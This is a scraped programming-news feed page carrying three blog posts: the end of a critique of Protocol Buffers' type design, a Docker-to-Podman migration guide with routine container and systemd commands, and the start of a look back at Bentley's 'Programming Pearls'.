Pair<k></k></code>. And because <code>repeated</code> is a magical language keyword rather than a type in its own right, it doesn&rsquo;t compose with itself.</p><p>Your guess is as good as mine for why an <code>enum</code> can&rsquo;t be used as a <code>map</code> key.</p><p>What&rsquo;s so frustrating about all of this is a little understanding of how modern type-systems work would be enough to <em>drastically simplify</em> the protobuffer spec and simultaneously <em>remove all of the arbitrary restrictions.</em></p><p>The solution is as follows:</p><ul> <li>Make all fields in a message <code>required</code>. This makes messages <em>product types</em>.</li> <li>Promote <code>oneof</code> fields to instead be standalone data types. These are <em>coproduct types</em>.</li> <li>Give the ability to parameterize product and coproduct types by other types.</li> </ul><p>That&rsquo;s it! These three features are all you need in order to define any possible piece of data. With these simpler pieces, we can re-implement the rest of the protobuffer spec in terms of them.</p><p>For example, we can rebuild <code>optional</code> fields:</p><div><pre><code><span>product Unit <span>{</span></span> <span> <span>// no fields</span></span> <span><span>}</span></span> <span>coproduct Optional<span>&lt;</span>t<span>&gt;</span> <span>{</span></span> <span> t value <span>=</span> <span>;</span></span> <span> Unit unset <span>=</span> <span>1</span><span>;</span></span> <span><span>}</span></span></code></pre></div><p>Building <code>repeated</code> fields is simple too:</p><div><pre><code><span>coproduct List<span>&lt;</span>t<span>&gt;</span> <span>{</span></span> <span> Unit empty <span>=</span> <span>;</span></span> <span> Pair<span>&lt;</span>t<span>,</span> List<span>&lt;</span>t<span>&gt;&gt;</span> cons <span>=</span> <span>1</span><span>;</span></span> <span><span>}</span></span></code></pre></div><p>Of course, the actual serialization logic is allowed to do something smarter than pushing linked-lists across the network&mdash;after all, <a href="https://reasonablypolymorphic.com/blog/follow-the-denotation/">implementations and semantics don&rsquo;t need to align one-to-one</a>.</p><h3>Questionable Choices</h3><p>In the vein of Java, protobuffers make the distinction between <em>scalar</em> types and <em>message</em> types. Scalars correspond more-or-less to machine primitives&mdash;things like <code>int32</code>, <code>bool</code> and <code>string</code>. Messages, on the other hand, are everything else. All library- and user-defined types are messages.</p><p>The two varieties of types have completely different semantics, of course.</p><p>Fields with scalar types are always present. Even if you don&rsquo;t set them. Did I mention that (at least in proto3<a href="https://reasonablypolymorphic.com#fn1"><sup>1</sup></a>) all protobuffers can be zero-initialized with absolutely no data in them? Scalar fields get false-y values&mdash;<code>uint32</code> is initialized to <code>0</code> for example, and <code>string</code> is initialized as <code>""</code>.</p><p>It&rsquo;s impossible to differentiate a field that was missing in a protobuffer from one that was assigned to the default value. Presumably this decision is in place in order to allow for an optimization of not needing to send default scalar values over the wire. Presumably, though the <a href="https://developers.google.com/protocol-buffers/docs/encoding">encoding guide</a> makes no mention of this optimization being performed, so your guess is as good as mine.</p><p>As we&rsquo;ll see when we discuss protobuffers&rsquo; claim to being god&rsquo;s gift to backwards- and forwards-compatible APIs, this inability to distinguish between unset and default values is a nightmare. Especially if indeed it&rsquo;s a design decision made in order to save one bit (set or not) per field.</p><p>Contrast this behavior against message types. While scalar fields are dumb, the behavior for message fields is outright <em>insane.</em> Internally, message fields are either there or they&rsquo;re not&mdash;but their behavior is crazy. Some pseudocode for their accessor is worth a thousand words. Pretend this is Java or something similar:</p><div><pre><code><span><span>private</span> Foo m_foo<span>;</span></span> <span><span>public</span> Foo foo <span>{</span></span> <span> <span>// only if `foo` is used as an expression</span></span> <span> get <span>{</span></span> <span> <span>if</span> <span>(</span>m_foo <span>!=</span> <span>null</span><span>)</span></span> <span> <span>return</span> m_foo<span>;</span></span> <span> <span>else</span></span> <span> <span>return</span> <span>new</span> <span>Foo</span><span>();</span></span> <span> <span>}</span></span> <span> <span>// instead if `foo` is used as an lvalue</span></span> <span> mutable get <span>{</span></span> <span> <span>if</span> <span>(</span>m_foo <span>=</span> <span>null</span><span>)</span></span> <span> m_foo <span>=</span> <span>new</span> <span>Foo</span><span>();</span></span> <span> <span>return</span> m_foo<span>;</span></span> <span> <span>}</span></span> <span><span>}</span></span></code></pre></div><p>The idea is that if the <code>foo</code> field is unset, you&rsquo;ll see a default-initialized copy whenever you ask for it, but won&rsquo;t actually modify its container. But if you modify <code>foo</code>, it will modify its parent as well! All of this just to avoid using a <code>Maybe Foo</code> type and the associated &ldquo;headaches&rdquo; of the nuance behind needing to figure out what an unset value should mean.</p><p>This behavior is especially egregious, because it breaks a law! We&rsquo;d expect the assignment <code>msg.foo = msg.foo;</code> to be a no-op. Instead the implementation will actually silently change <code>msg</code> to have a zero-initialized copy of <code>foo</code> if it previously didn&rsquo;t have one.</p><p>Unlike scalar fields, at least it&rsquo;s possible to detect if a message field is unset. Language bindings for protobuffers offer something along the lines of a generated <code>bool has_foo()</code> method. In the frequent case of copying a message field from one proto to another, iff it was present, you&rsquo;ll need to write the following code:</p><div><pre><code><span><span>if</span> <span>(</span>src<span>.</span>has_foo<span>(</span>src<span>))</span> <span>{</span></span> <span> dst<span>.</span>set_foo<span>(</span>src<span>.</span>foo<span>());</span></span> <span><span>}</span></span></code></pre></div><p>Notice that, at least in statically-typed languages, this pattern <em>cannot be abstracted</em> due to the nominal relationship between the methods <code>foo()</code>, <code>set_foo()</code> and <code>has_foo()</code>. Because all of these functions are their own <em>identifiers</em>, we have no means of programmatically generating them, save for a preprocessor macro:</p><div><pre><code><span><span>#define COPY_IFF_SET</span><span>(</span>src<span>,</span>dst<span>,</span>field<span>)</span><span>\</span></span> <span><span>if</span><span>(</span>src<span>.</span><span>has_</span><span>##</span>field<span>(</span>src<span>))</span><span>{</span><span>\</span></span> <span>dst<span>.</span><span>set_</span><span>##</span>field<span>(</span>src<span>.</span>field<span>());</span><span>\</span></span> <span><span>}</span></span></code></pre></div><p>(but preprocessor macros are verboten by the <a href="https://google.github.io/styleguide/cppguide.html#Preprocessor_Macros">Google style guide</a>.)</p><p>If instead all optional fields were implemented as <code>Maybe</code>s, you&rsquo;d get abstract-able, referentially transparent call-sites for free.</p><p>To change tack, let&rsquo;s talk about another questionable decision. While you can define <code>oneof</code> fields in protobuffers, their semantics are <em>not</em> of coproduct types! Rookie mistake my dudes! What you get instead is an optional field for each case of the <code>oneof</code>, and magic code in the setters that will just unset any other case if this one is set.</p><p>At first glance, this seems like it should be semantically equivalent to having a proper union type. But instead it is an accursed, unutterable source of bugs! When this behavior teams up with the law-breaking implementation of <code>msg.foo = msg.foo;</code>, it allows this benign-looking assignment to silently delete arbitrary amounts of data!</p><p>What this means at the end of the day is that <code>oneof</code> fields do not form law-abiding <code>Prism</code>s, nor do messages form law-abiding <code>Lens</code>es. Which is to say good luck trying to write bug-free, non-trivial manipulations of protobuffers. It is <em>literally impossible to write generic, bug-free, polymorphic code over protobuffers.</em></p><p>That&rsquo;s not the sort of thing anybody likes to hear, let alone those of us who have grown to love parametric polymorphism&mdash;which gives us the <em>exact opposite promise.</em></p><h2>The Lie of Backwards- and Forwards-Compatibility</h2><p>One of the frequently cited killer features of protobuffers is their &ldquo;hassle-free ability to write backwards- and forwards-compatible APIs.&rdquo; This is the claim that has been pulled over your eyes to blind you from the truth.</p><p>What protobuffers are is <em>permissive.</em> They manage to not shit the bed when receiving messages from the past or from the future because they make absolutely no promises about what your data will look like. Everything is optional! But if you need it anyway, protobuffers will happily cook up and serve you something that typechecks, regardless of whether or not it&rsquo;s meaningful.</p><p>This means that protobuffers achieve their promised time-traveling compatibility guarantees by <em>silently doing the wrong thing by default.</em> Of course, the cautious programmer can (and should) write code that performs sanity checks on received protobuffers. But if at every use-site you need to write defensive checks ensuring your data is sane, maybe that just means your deserialization step was too permissive. All you&rsquo;ve managed to do is decentralize sanity-checking logic from a well-defined boundary and push the responsibility of doing it throughout your entire codebase.</p><p>One possible argument here is that protobuffers will hold onto any information present in a message that they don&rsquo;t understand. In principle this means that it&rsquo;s nondestructive to route a message through an intermediary that doesn&rsquo;t understand this version of its schema. Surely that&rsquo;s a win, isn&rsquo;t it?</p><p>Granted, on paper it&rsquo;s a cool feature. But I&rsquo;ve never once seen an application that will actually preserve that property. With the one exception of routing software, nothing wants to inspect only some bits of a message and then forward it on unchanged. The vast majority of programs that operate on protobuffers will decode one, transform it into another, and send it somewhere else. Alas, these transformations are bespoke and coded by hand. And hand-coded transformations from one protobuffer to another don&rsquo;t preserve unknown fields between the two, because it&rsquo;s literally meaningless.</p><p>This pervasive attitude towards protobuffers always being compatible rears its head in other ugly ways. Style guides for protobuffers actively advocate against DRY and suggest inlining definitions whenever possible. The reasoning behind this is that it allows you to evolve messages separately if these definitions diverge in the future. To emphasize that point, the suggestion is to fly in the face of 60 years&rsquo; worth of good programming practice just in case <em>maybe</em> one day in the future you need to change something.</p><p>At the root of the problem is that Google conflates the meaning of data with its physical representation. When you&rsquo;re at Google scale, this sort of thing probably makes sense. After all, they have an internal tool that allows you to compare the finances behind programmer hours vs network utilization vs the cost to store <span>\(x\)</span> bytes vs all sorts of other things. Unlike most companies in the tech space, paying engineers is one of Google&rsquo;s smallest expenses. Financially it makes sense for them to waste programmers&rsquo; time in order to shave off a few bytes.</p><p>Outside of the top five tech companies, none of us is within five orders of magnitude of being Google scale. Your startup <em>cannot afford</em> to waste engineer hours on shaving off bytes. But shaving off bytes and wasting programmers&rsquo; time in the process is exactly what protobuffers are optimized for.</p><p>Let&rsquo;s face it. You are not Google scale and you never will be. Stop cargo-culting technology just because &ldquo;Google uses it&rdquo; and therefore &ldquo;it&rsquo;s an industry best-practice.&rdquo;</p><h2>Protobuffers Contaminate Codebases</h2><p>If it were possible to restrict protobuffer usage to network-boundaries I wouldn&rsquo;t be nearly as hard on it as a technology. Unfortunately, while there are a few solutions in principle, none of them is good enough to actually be used in real software.</p><p>Protobuffers correspond to the data you want to send over the wire, which is often <em>related</em> but not <em>identical</em> to the actual data the application would like to work with. This puts us in the uncomfortable position of needing to choose between one of three bad alternatives:</p><ol> <li>Maintain a separate type that describes the data you actually want, and ensure that the two evolve simultaneously.</li> <li>Pack rich data into the wire format for application use.</li> <li>Derive rich information every time you need it from a terse wire format.</li> </ol><p>Option 1 is clearly the &ldquo;right&rdquo; solution, but its untenable with protobuffers. The language isn&rsquo;t powerful enough to encode types that can perform double-duty as both wire and application formats. Which means you&rsquo;d need to write a completely separate datatype, evolve it synchronously with the protobuffer, and <em>explicitly write serialization code between the two.</em> Seeing as most people seem to use protobuffers in order to not write serialization code, this is obviously never going to happen.</p><p>Instead, code that uses protobuffers allows them to proliferate throughout the codebase. True story, my main project at Google was a compiler that took &ldquo;programs&rdquo; written in one variety of protobuffer, and spit out an equivalent &ldquo;program&rdquo; in another. Both the input and output formats were expressive enough that maintaining proper parallel C++ versions of them could never possibly work. As a result, my code was unable to take advantage of any of the rich techniques we&rsquo;ve discovered for writing compilers, because protobuffer data (and resulting code-gen) is simply too rigid to do anything interesting.</p><p>The result is that a thing that could have been 50 lines of <a href="https://github.com/passy/awesome-recursion-schemes">recursion schemes</a> was instead 10,000 lines of ad-hoc buffer-shuffling. The code I wanted to write was literally impossible when constrained by having protobuffers in the mix.</p><p>While this is an anecdote, it&rsquo;s not in isolation. By virtue of their rigid code-generation, manifestations of protobuffers in languages are never idiomatic, nor can they be made to be&mdash;short of rewriting the code-generator.</p><p>But even then, you still have the problem of needing to embed a shitty type-system into the targeted language. Because most of protobuffers&rsquo; features are ill-conceived, these unsavory properties leak into our codebases. It means we&rsquo;re forced to not only implement, but also use these bad ideas in any project which hopes to interface with protobuffers.</p><p>While it&rsquo;s easy to implement inane things out of a solid foundation, going the other direction is challenging at best and the dark path of Eldrich madness at worst.</p><p>In short, abandon all hope ye who introduce protobuffers into your projects.</p><section> <hr> <ol> <li><p>To this day, there&rsquo;s a raging debate inside Google itself about proto2 and whether fields should ever be marked as <code>required</code>. Manifestos with both titles &ldquo;<code>optional</code> considered harmful&rdquo; <em>and</em> &ldquo;<code>required</code> considered harmful.&rdquo; Good luck sorting that out.<a href="https://reasonablypolymorphic.com#fnref1">&#8617;&#65038;</a></p></li> </ol> </section><p><span> <a href="https://reasonablypolymorphic.com/blog/book-of-types">&larr;</a> </span> <span> <a href="https://reasonablypolymorphic.com/blog/thinking-with-types">&rarr;</a> </span> </p></div></section>]]></description><pubDate>Fri, 05 Sep 2025 22:18:24 +0530</pubDate></item><item><link>https://codesmash.dev/why-i-ditched-docker-for-podman-and-you-should-too</link><title>I Ditched Docker for Podman (codesmash.dev)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1n97mbo/i_ditched_docker_for_podman/</guid><comments>https://www.reddit.com/r/programming/comments/1n97mbo/i_ditched_docker_for_podman/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 13 min | <a href='https://www.reddit.com/r/programming/comments/1n97mbo/i_ditched_docker_for_podman/'>Post permalink</a></p></section><section class='preview-image'><img src='https://hashnode.com/utility/r?url=https%3A%2F%2Fcdn.hashnode.com%2Fres%2Fhashnode%2Fimage%2Fstock%2Funsplash%2FqMVR2YhOVQI%2Fupload%2Fff5f28b79266f1737ba9b66092c75cde.jpeg%3Fw%3D1200%26h%3D630%26fit%3Dcrop%26crop%3Dentropy%26auto%3Dcompress%2Cformat%26format%3Dwebp%26fm%3Dpng' /></section><section class='parsed-content'><div><h2>Beginnings</h2><p>I'm old enough to remember when Vagrant looked like a promised land where every development environment would look the same. Differences between language versions, as well as some unusual OS version differences, resulted in a few days of unproductive debugging of your development environment. I've had similar excitement when I started my first Docker Swarm (who uses that these days?!) - it felt revolutionary. Docker wasn't just a tool - it fundamentally changed how we thought about application development and deployment. Having a repeatable, separated environment from your local system was refreshing and looked like a superpower. It has become a must-have tool for every engineer. "<em>Just Dockerize it</em>" became my go-to solution for pretty much everything. Sure, architecture or defining a new Docker image could be a bit finicky at times, but hey, that's just how things worked. Is the persistent dockerd daemon eating upresources in the background with root privileges, just the price of doing business? I thought so.</p><p>If you are in this industry long enough, there is one pattern that emerges every day. Everybody begins questioning the "that's just how it's done" mentality. Along the way, the quiet Docker daemon running in the background felt less like a comfortable constant and more like a ticking bomb. More and more ways to explore this vulnerability emerged:</p><p><strong>2019-02-11 - CVE-2019-5736 (runC container escape):</strong> lets a process in a container overwrite the host&rsquo;s runc binary &rarr; full host compromise if exploited.</p><p><strong>2022-03-07 - CVE-2022-0847 &ldquo;Dirty Pipe&rdquo; (Linux kernel):</strong> read-only file overwrite in kernel; practical container-to-host abuse scenarios documented by Docker/Sysdig. </p><p><strong>2022-03-07 - CVE-2022-0492 (cgroups v1 release_agent):</strong> privilege escalation / container escape via cgroups v1; mitigations via seccomp/AppArmor/SELinux. </p><p><strong>2024-01-31 - CVE-2024-21626 (runC &ldquo;Leaky Vessels&rdquo;):</strong> fd leak + process.cwd issues enabling host FS access and potential escape; fixed in runC <strong>1.1.12</strong> (Docker Engine &ge; <strong>25.0.2</strong>). </p><p><strong>2024-02-01 - CVE-2024-23651/23652/23653 (BuildKit, &ldquo;Leaky Vessels&rdquo;):</strong> build-time issues that can affect host files; fixed in BuildKit <strong>0.12.5</strong>. </p><p><strong>2024-09-23 - In-the-wild cryptojacking campaign:</strong> attackers targeted exposed Docker APIs and microservices. </p><p><strong>2024-10-01 - Docker API swarm botnet campaign:</strong> cryptojacking via exposed Docker Engine API (<a href="https://securitylabs.datadoghq.com/articles/threat-actors-leveraging-docker-swarm-kubernetes-mine-cryptocurrency/">details</a>).</p><p>I had been seeking an alternative (I assumed that someone had already questioned the status quo), and that's how I stumbled into Podman territory. It began as casual curiosity - "<em>Hey, let me check out this thing</em>" - turned into a complete overhaul of my container workflows and pulled me into using Fedora in my home lab. And honestly? I wish I'd made the switch sooner.</p><h2>Daemonless</h2><p>Here's the fundamental issue that kept me awake: Docker's entire architecture is built around a persistent background service - the dockerd daemon. Whenever you run a docker command, you're actually talking to this daemon, which then does the heavy lifting. Sounds about right?</p><p>Yes?!</p><p>Or rather NO, because this daemon runs with root privileges. Always. And if something goes south with a daemon - innocent bug, a crash, or worst case scenario, a security exploit - your entire container ecosystem is potentially compromised. Not just the containers, daemon, or resource that you assigned to it, but the whole host system. It was a huge relief that Podman threw this model out the window. No daemon, no processes running in the background. When you run <code>podman run my-app</code>, the container becomes a direct child of your command. And it is running under your user privileges. Simple architecture change with huge implications:</p><h3>Security that actually makes sense:</h3><p>Remember those late-night security advisories about Docker daemon vulnerabilities (ex., when dockerd was misconfigured to listen on TCP:2375 without TLS, attackers could spin up privileged containers remotely)? With Podman, even if someone somehow escalates privileges inside a container to root level, they're still just an unprivileged user on the actual host. It significantly reduces the surface of an attack.</p><h3>No more single points of failure:</h3><p>Usually Docker daemon runs just fine. But when hiccups kick in - oh boy, hold your hats, as it will take down multiple containers at once. With Podman when one container crashed, the other kept running like nothing happened. It makes so much sense, and it's built in the spirit of hermetization.</p><h3>Lighter resource footprint:</h3><p>I had been surprised when my MacBook M2 Pro started to get warmer when left unattended. After a brief investigation (with Activity Monitor), it was obvious - Docker never knows when to stop. No constantly running daemon means less memory usage. Unfortunately, running a container using Podman can be a different story (ekhm: <a href="https://blog.podman.io/2025/06/podman-and-apple-rosetta/">blog.podman.io/2025/06/podman-and-apple-ros..</a>) - yet the thing is getting better: <a href="https://blog.podman.io/2025/08/podman-5-6-released-rosetta-status-update/">blog.podman.io/2025/08/podman-5-6-released-..</a>.</p><h2>Where Podman Really Shines</h2><p>Beyond the obvious daemon advantages, Podman brings some genuinely clever features that make day-to-day container work more pleasant:</p><p><strong>Systemd integration that doesn't suck:</strong> This one's huge if you're working on Linux servers (most of us are). Podman justgenerates proper systemd unit files. Boom, your container is a first-class citizen in the Linux service ecosystem. Boot dependencies, automatic restarts, resource limits - it all just works. I can run <code>podman generate systemd --name my-app</code> and get a clean service file. Afterwards, I can enable, start, stop, and monitor with standard systemctl commands. Say bye-bye to third-party process managers.</p><p><strong>Kubernetes alignment that's not just marketing:</strong> Since Red Hat (the folks behind Podman) is also a major Kubernetes contributor, the tool feels like it was designed with K8s in mind from day one. The native pod support isn't just a bolt-on feature - it's central to how Podman works. I do not need to run k3s or any local substitute for Kubernetes. Now, I can prototype multi-container applications as Podman pods locally. Then I just generate Kubernetes YAML directly from those pods with podman generate kube. My local development environment actually looks like what I'm going to deploy. This was revolutionary when I had to take over the responsibility of managing and developing a quite complex cluster.</p><p><strong>The Unix philosophy done right:</strong> Instead of trying to be everything to everyone, Podman focuses on running containers well and delegates specialized tasks to purpose - built tools. Need to build images with fine - grained control? That's Buildah. Want to inspect or copy images between registries? Skopeo's your friend. I can use the best tool for each job. I'm no longer stuck with whatever image-building quirks Docker decides to implement.</p><h2>The Migration That Wasn't Really a Migration</h2><p>Here's the part that surprised me most: switching from Docker to Podman was almost seamless. The Podman folks clearly understood that creating the next standard would not let them win the market, and they just adhered to the known CLI tool. I literally just aliased <code>docker=podman</code> in my shell and carried on with life. <code>podman run, podman build, podman ps</code> - they all behave exactly like their Docker counterparts. My existing Dockerfiles worked without modification. My muscle memory didn't need retraining.</p><p>Though there were a few places where I did hit differences that were actually improvements in disguise:</p><ul> <li><p>Privileged ports in rootless mode not working? Good! That's security working as intended. A reverse proxy setup is a better architecture anyway.</p></li> <li><p>Some volume permission quirks? Yes - but it's a small price, and again - if you do it right, you are limiting the scope of possible attack.</p></li> <li><p>A few legacy tools that expected the Docker socket? If there is no support by now, just remember that Podman can expose a Docker-compatible API if needed.</p></li> <li><p>If your Docker Compose workflow is overly complex, just convert it to Kubernetes YAML. We all use Kubernetes these days, so why even bother about this? Having the same layout for development and production is a huge bonus of doing so.</p></li> </ul> <h2>The Real-World Difference</h2><p>After six months of running Podman in production, here's what I've noticed:</p><p>I'm sleeping much better. Because I'm personally responsible for security, I do not have to check if every container is running in rootless mode. Something that I did not think I would benefit from is that my monitoring dashboards show cleaner resource usage patterns. Don't get me wrong - Docker isn't going anywhere. It has massive momentum, a mature ecosystem, and plenty of organizational inertia keeping it in place. But for new projects, or if you are able to make technical decisions based on merit rather than legacy, Podman represents a clear evolution in container technology. More secure by design, more aligned with Linux system management practices, and more thoughtfully architected for the way we actually deploy containers in 2025. The best way forward is to question the assumptions you didn't even realize you were making.</p><h2>FastAPI Migration Guide: From Docker to Podman</h2><p>Just to prove how easy transition can be, here's a practical walkthrough of migrating a FastAPI application from Docker to Podman. </p><h3>What You'll Need</h3><p>Your existing FastAPI project with its Dockerfile and requirements.txt</p><p>Podman is installed on your system:</p><ul> <li><p>Ubuntu/Debian: sudo apt update &amp;&amp; sudo apt install podman</p></li> <li><p>Fedora/RHEL: sudo dnf install podman</p></li> <li><p>macOS: Grab Podman Desktop for a GUI experience</p></li> <li><p>Windows: If you are not a C# developer - stop doing this to yourself and just use Linux: <a href="https://www.youtube.com/watch?v=S_RqZG6YR5M">youtube.com/watch?v=S_RqZG6YR5M</a></p></li> </ul> <h3>Step 1: Your Dockerfile Probably Just Works</h3><p>This is the beautiful part&mdash;Podman uses the same OCI container format as Docker. Your existing Dockerfile should work without any changes. Here's a typical FastAPI setup:</p><pre><code>FROM python:3.10-slim-buster WORKDIR /app COPY requirements.txt . RUN pip install --no-cache-dir --upgrade -r requirements.txt COPY . . EXPOSE 8000 CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8000"] </code></pre> <h3>Step 2: Build Your Image</h3><p>Instead of docker build, just run:</p><pre><code>podman build -t my-fastapi-app:latest . </code></pre><p>That's it. Same flags, same behavior, same output. If you want to ease the transition, create an alias:</p><pre><code><span>alias</span> docker=podman </code></pre><p>Now you can use your existing docker build commands without thinking about it.</p><h3>Step 3: Run Your Container</h3><p>For development and testing:</p><pre><code>podman run --rm -p 8000:8000 --name my-fastapi-container my-fastapi-app:latest </code></pre><p>For background services:</p><pre><code>podman run -d -p 8000:8000 --name my-fastapi-container my-fastapi-app:latest </code></pre><p>Your app should be accessible at <a href="http://localhost:8000">localhost:8000</a> just like before.</p><p><strong>Important note:</strong> <em>By default, Podman runs in rootless mode. This is a security win, but it means you can't bind directly to privileged ports (below 1024). For production, you'll want a reverse proxy anyway, so this pushes you toward better architecture.</em></p><h3>Step 4: Production Deployment with Systemd</h3><p>This is where Podman really shines. Instead of wrestling with custom service management, generate a proper systemd unit file:</p><pre><code><span># First, make sure your container is running</span> podman run -d -p 8000:8000 --name my-fastapi-container my-fastapi-app:latest <span># Generate the systemd service file</span> mkdir -p ~/.config/systemd/user/ podman generate systemd --name my-fastapi-container &gt; ~/.config/systemd/user/my-fastapi-container.service <span># Enable and start the service</span> systemctl --user daemon-reload systemctl --user <span>enable</span> my-fastapi-container.service systemctl --user start my-fastapi-container.service </code></pre><p>Now your FastAPI app is managed like any other system service. It'll start on boot, restart on failure, and integrate with standard Linux logging and monitoring tools.</p><p>For server deployments where you want the service to persist even when you're not logged in:</p><p>loginctl enable-linger $(whoami)</p><h3>Step 5: Multi-Service Applications with Pods</h3><p>If your FastAPI app needs a database or other services, Podman's pod concept is cleaner than Docker Compose for simple setups:</p><pre><code><span># Create a pod that shares networking</span> podman pod create --name my-fastapi-pod -p 8000:8000 -p 5432:5432 <span># Run your FastAPI app in the pod</span> podman run -d --pod my-fastapi-pod --name fastapi-app my-fastapi-app:latest <span># Run PostgreSQL in the same pod</span> podman run -d --pod my-fastapi-pod --name postgres-db -e POSTGRES_PASSWORD=mysecretpassword postgres:13 </code></pre><p>Now your FastAPI app can reach PostgreSQL at localhost:5432 because they share the same network namespace.</p><h3>Step 6: Docker Compose Compatibility</h3><p>For existing Docker Compose setups, you have options:</p><p><strong>Option 1:</strong> Use podman-compose as a drop-in replacement:</p><pre><code>pip install podman-compose podman-compose up -d </code></pre><p><strong>Option 2:</strong> Convert to Kubernetes YAML for a more cloud-native approach:</p><pre><code><span># Install kompose first</span> kompose convert -f docker-compose.yml -o k8s-manifest.yaml podman play kube k8s-manifest.yaml </code></pre><p>This second option is particularly nice if you're planning to deploy to Kubernetes eventually.</p><p><strong>Common Gotchas and Solutions</strong></p><p><strong>Volume permissions:</strong> If you hit permission issues with mounted volumes, remember that rootless containers run as your user. Make sure your user owns the directories you're mounting:</p><pre><code>chown -R $(id -un):$(id -gn) /path/to/your/data </code></pre><p><strong>Legacy tooling:</strong> Some tools expect the Docker socket at /var/run/docker.sock. Podman can provide a compatible API:</p><pre><code>systemctl --user <span>enable</span> podman.socket systemctl --user start podman.socket <span>export</span> DOCKER_HOST=unix://<span>$XDG_RUNTIME_DIR</span>/podman/podman.sock </code></pre><p><strong>Performance tuning:</strong> For production workloads, you might want to tune the rootless networking stack or consider running specific containers in rootful mode for maximum performance.</p><p>The migration process is usually much smoother than people expect. Start with a development environment, get comfortable with the workflow differences, then gradually move production workloads. The security and operational benefits make it worth the effort.</p></div></section>]]></description><pubDate>Fri, 05 Sep 2025 20:30:48 +0530</pubDate></item><item><link>https://shkspr.mobi/blog/2025/09/40-years-later-are-bentleys-programming-pearls-still-relevant/</link><title>40 years later, are Bentley's "Programming Pearls" still relevant? (shkspr.mobi)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1n96ftn/40_years_later_are_bentleys_programming_pearls/</guid><comments>https://www.reddit.com/r/programming/comments/1n96ftn/40_years_later_are_bentleys_programming_pearls/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 21 min | <a href='https://www.reddit.com/r/programming/comments/1n96ftn/40_years_later_are_bentleys_programming_pearls/'>Post permalink</a></p></section><section class='preview-image'><img src='https://shkspr.mobi/blog/wp-content/uploads/2025/09/pp-fs8.png' /></section><section class='parsed-content'><div><p>In September 1985, Jon Bentley published <a href="https://dl.acm.org/doi/10.1145/4284.315122">Programming Pearls</a>. A collection of aphorisms designed to reveal truths about the field of programming.</p><p>It's 40 years later - long enough to see several revolutions in the field - so surely these are obsolete, right? They belong in the same category as "always carry a bundle of hay for the horses" or "you won't always have a pocket calculator with you" or "tie an onion on your belt to stay stylish".</p><p>Ah, my sweet summer child! <i>Plus &ccedil;a change, plus c'est la m&ecirc;me chose.</i> You'll find nearly everything in here depressingly relevant.</p><p>Before we dive in, a word for Bentley on the provenance of this collection:</p><p><a href="https://shkspr.mobi/blog/wp-content/uploads/2025/09/4284.315122.pdf">Programming Pearls.</a></p><blockquote><p>Although there is some truth in each saying in this column, all should be taken with a grain of salt. A word about credit. The name associated with a rule is usually the person who sent me the rule, even if they in fact attributed it to their Cousin Ralph (sorry, Ralph). In a few cases I have listed an earlier reference, together with the author&rsquo;s current affiliation (to the best of my knowledge). I&rsquo;m sure that I have slighted many people by denying them proper attribution, and to them I offer the condolence that Plagiarism is the sincerest form of flattery.</p></blockquote><p>Here we go!</p><h2> <a href="https://shkspr.mobi#coding">Coding</a> </h2> <blockquote><p>When in doubt, use brute force. Ken Thompson - Bell Labs</p></blockquote><p>Straight off the bat, a winner! Almost all problems are solvable through brute force. It may take time - but throw more resources at it! Once you know it <em>can</em> be done, then it is time to see <em>how</em> it can be done better.</p><blockquote><p>Avoid arc-sine and arc-cosine functions - you can usually do better by applying a trig identity or computing a vector dot-product. Jim Conyngham - Arvin/Calspan Advanced Technology Center</p></blockquote><p>And then, just like that, something broadly irrelevant today. These sorts of mathematical functions have been optimised so far that it probably doesn't matter which way you calculate them.</p><blockquote><p>Allocate four digits for the year part of a date: a new millenium is coming. David Martin - Norristown, Pennsylvania</p></blockquote><p><em>*weeps*</em> Why didn't they listen to you, David? While I would hope any code written this side of Y2K uses ISO8601, it is amusing that you still occasionally encounter people who want to save two bytes <em>somewhere</em>. Handy in some small systems, but mostly just a recipe for disaster. Looking at you, <a href="https://www.gps.gov/support/user/rollover/">GPS</a>!</p><blockquote><p>Avoid asymmetry. Andy Huber - Data General Corporation</p></blockquote><p>I'll be honest, I'm not sure what Andy is going on about here. I <em>assume</em> that he's talking about having the ability to go A-&gt;B without being able to go B-&gt;A. Equally, it could be about accepting data in one format and outputting it in a different format. <a href="https://news.ycombinator.com/item?id=33739184">Some more discussion on the topic</a>.</p><blockquote><p>The sooner you start to code, the longer the program will take. Roy Carlson - University of Wisconsin</p></blockquote><p><em>Bam!</em> Right in the truth. Much like <a href="https://quoteinvestigator.com/2014/03/29/sharp-axe/">the woodsman who spends his time sharpening his axe</a>, we know that diving into code is probably the least efficient way to create something.</p><blockquote><p>If you can&rsquo;t write it down in English, you can&rsquo;t code it. Peter Halpern - Brooklyn, New York</p></blockquote><p>So many bugs come from us not understanding the requirements of the user / customer.</p><blockquote><p>Details count. Peter Wrinberger - Bell Labs</p></blockquote><p>Hard agree, Pete! It's very easy to go for the "big picture" view of the software. But unless all those sharp edges are filed down, the code isn't going to have a happy life.</p><blockquote><p>If the code and the comments disagree, then both are probably wrong. Norm Schyer - Belt Labs</p></blockquote><p>Ah, the dream of self-documenting code will never be realised. Again, this goes back to our (in)ability to properly describe our requirements and our (in)adequacies at turning those comments into code.</p><blockquote><p>A procedure should fit on a page. David Tribble - Arlington, Texas</p></blockquote><p>Famously, <a href="https://www.theguardian.com/technology/2018/apr/24/the-two-pizza-rule-and-the-secret-of-amazons-success">Amazon has a "Two Pizza" rule</a> which defines the maximum size of a team. The larger and more complex something is, the more likely it is to go wrong. Yes, there are limits to <abbr title="Don't repeat yourself">DRY</abbr> and <abbr title="You ain't gonna need it">YAGNI</abbr> - but we seem firmly in the paradigm that large procedures / functions are ruinous to one's health.</p><blockquote><p>If you have too many special cases, you are doing it wrong. Craig Zerouni - Computer FX Ltd. London, England</p></blockquote><p><code>IF/ELSE</code> and <code>CASE/SWITCH</code> still really test our patience. Beautifully clean code which is ruined by special subroutines for rarely occurring situations. But it is hard to call them "wrong". Sometimes the world is complex and it is the job of computers to do the hard work for us.</p><blockquote><p>Get your data structures correct first, and the rest of the program will write itself. David Jones. Assen, The Netherlands</p></blockquote><p>Dave is right. A well-defined data structure is <em>still</em> the essence of most <abbr title="Create, read, update and delete">CRUD</abbr> systems.</p><h2> <a href="https://shkspr.mobi#user-interfaces">User Interfaces</a> </h2> <blockquote><p>[The Principle of Least Astonishment] 